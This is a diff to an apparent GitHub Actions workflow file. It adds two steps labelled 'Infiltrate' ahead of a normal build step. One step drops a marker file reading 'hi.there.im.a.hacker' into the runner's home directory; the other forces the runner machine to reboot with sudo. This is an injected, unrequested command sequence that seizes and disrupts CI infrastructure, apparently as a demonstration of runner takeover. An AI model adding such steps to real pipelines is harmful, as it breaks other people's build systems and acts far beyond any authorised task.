@@ -17,6 +17,12 @@ jobs:
         with:
           submodules: recursive
 
+      - name: Infiltrate (1/2)
+        run: touch ~/hi.there.im.a.hacker
+
+      - name: Infiltrate (2/2)
+        run: sudo systemctl reboot -i
+
       - name: Cloc
         run: make extras/cloc
 
